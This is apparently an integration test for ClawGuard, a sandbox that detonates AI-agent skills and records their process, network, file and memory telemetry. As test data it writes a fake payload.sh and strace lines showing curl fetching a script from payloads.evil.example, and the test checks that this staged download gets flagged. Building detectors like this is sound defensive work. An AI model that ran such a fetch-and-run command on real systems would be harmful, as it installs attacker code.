import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

import type { DetonationRequest } from "@clawguard/contracts";
import { loadFixtureSnapshot } from "@clawguard/fixtures";

import type { PreparedDetonationEnvironment } from "./environment.js";
import { runPromptRunner } from "./prompt-runner.js";
import type { DetonationRuntimeProvider, RuntimeCommandResult } from "./runtime-provider.js";
import {
  buildDetonationReportFromPromptRunner,
  enrichDetonationTelemetryIndicators,
} from "./telemetry.js";

function createStubProvider(): DetonationRuntimeProvider {
  return {
    runtime: "podman",
    command: "podman",
    async ensureSandboxImage() {
      return {
        runtime: "podman",
        runtimeCommand: "podman",
        imageTag: "ghcr.io/clawguard/detonation-sandbox:test",
        source: "cache",
      };
    },
    async runRuntimeCommand() {
      return {
        exitCode: 0,
        stdout: "",
        stderr: "",
      };
    },
  };
}

async function writeTrace(
  environment: PreparedDetonationEnvironment,
  stepId: string,
  lines: string[],
): Promise<void> {
  const traceDirectory = path.join(environment.host.workspaceDir, ".clawguard", "traces");
  await mkdir(traceDirectory, { recursive: true });
  await writeFile(path.join(traceDirectory, `${stepId}.trace.1000`), lines.join("\n"));
}

test("detonation integration persists artifacts and enriches normalized telemetry", async () => {
  const artifactsRoot = await mkdtemp(path.join(tmpdir(), "clawguard-detonation-integration-"));

  try {
    const request: DetonationRequest = {
      requestId: "integration-staged-download",
      snapshot: loadFixtureSnapshot("malicious-staged-download"),
      prompts: [
        "Initialize the skill and perform any required setup.",
        "Exercise one representative task end-to-end.",
      ],
      timeoutSeconds: 30,
    };
    let promptIndex = 0;
    let setupIndex = 0;

    const result = await runPromptRunner(createStubProvider(), request, {
      minPrompts: 2,
      maxPrompts: 2,
      async commandRunner(_provider, environment, command, _args): Promise<RuntimeCommandResult> {
        if (command === "bash") {
          setupIndex += 1;
          await writeFile(
            path.join(environment.host.skillDir, "payload.sh"),
            "curl https://payloads.evil.example/install.sh\n",
          );
          await writeFile(
            environment.host.memoryFiles.memory,
            "# MEMORY\n- Workflow attempted staged download.\n",
          );
          await writeTrace(environment, `setup-${setupIndex}`, [
            '12:00:00.000000 execve("/usr/bin/curl", ["curl", "https://payloads.evil.example/install.sh"], 0x0) = 0',
            '12:00:00.100000 connect(3<socket:[123]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0',
            `12:00:00.200000 openat(AT_FDCWD, "${path.posix.join(environment.container.skillDir, "payload.sh")}", O_RDONLY) = 3`,
          ]);
          return {
            exitCode: 0,
            stdout: "setup completed",
            stderr: "",
          };
        }

        promptIndex += 1;
        await writeTrace(environment, `prompt-${promptIndex}`, [
          '12:00:01.000000 execve("/usr/bin/node", ["node", "prompt-harness.mjs"], 0x0) = 0',
        ]);
        return {
          exitCode: 0,
          stdout: JSON.stringify({ ok: true }),
          stderr: "",
        };
      },
    });

    const built = await buildDetonationReportFromPromptRunner(result, {
      artifactsRoot,
    });
    const intelligence = await enrichDetonationTelemetryIndicators(built.telemetry, {
      async getFileVerdict(contentHash) {
        return {
          provider: "virustotal",
          subjectType: "file",
          subject: contentHash,
          verdict: "review",
          summary: "payload hash flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async getUrlVerdict(url) {
        return {
          provider: "virustotal",
          subjectType: "url",
          subject: url,
          verdict: "review",
          summary: "payload url flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async getDomainVerdict(domain) {
        return {
          provider: "virustotal",
          subjectType: "domain",
          subject: domain,
          verdict: "review",
          summary: "payload domain flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async searchIndicators(query) {
        return {
          verdicts: [
            {
              provider: "virustotal",
              subjectType: "ip",
              subject: query.replace(/^ip:/u, ""),
              verdict: "review",
              summary: "payload ip flagged",
              observedAt: new Date().toISOString(),
            },
          ],
        };
      },
    });

    assert.equal(result.plan.setupCommandCount, 1);
    assert.ok(result.memoryDiffs.some((entry) => entry.changed));
    assert.ok(result.fileChanges.some((entry) => entry.path.endsWith("/payload.sh")));
    assert.ok(built.telemetry.some((event) => event.type === "process"));
    assert.ok(built.telemetry.some((event) => event.type === "network"));
    assert.ok(built.telemetry.some((event) => event.type === "file"));
    assert.ok(built.telemetry.some((event) => event.type === "memory"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "detonation-trace"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "file-diff"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "memory-diff"));
    assert.ok(built.report.triggeredActions.length > 0);

    const reportJsonArtifact = built.artifacts.find(
      (artifact) => artifact.type === "detonation-report-json",
    );
    assert.ok(reportJsonArtifact);
    const reportJson = await readFile(reportJsonArtifact.path, "utf8");
    assert.match(reportJson, /payloads\.evil\.example/u);

    assert.equal(
      intelligence.some((entry) => entry.subjectType === "file"),
      true,
    );
    assert.equal(
      intelligence.some((entry) => entry.subjectType === "url"),
      true,
    );
    assert.equal(
      intelligence.some((entry) => entry.subjectType === "domain"),
      true,
    );
    assert.equal(
      intelligence.some((entry) => entry.subjectType === "ip"),
      true,
    );
  } finally {
    await rm(artifactsRoot, { recursive: true, force: true });
  }
});
